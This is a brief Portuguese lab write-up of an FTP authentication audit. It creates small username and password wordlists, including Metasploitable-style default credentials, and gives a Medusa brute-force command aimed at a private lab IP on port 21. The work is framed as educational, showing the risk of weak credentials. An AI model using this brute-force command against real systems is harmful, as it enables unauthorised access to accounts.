# Auditoria de Autenticação FTP

Após identificar o serviço FTP ativo na porta 21, foi realizada uma simulação de auditoria utilizando a ferramenta Medusa.

Foram criadas duas wordlists simples para o ambiente de laboratório.

## Lista de Usuários

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

## Lista de Senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

## Teste de Autenticação

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

A atividade foi realizada exclusivamente em ambiente controlado para compreender os riscos relacionados ao uso de credenciais fracas.
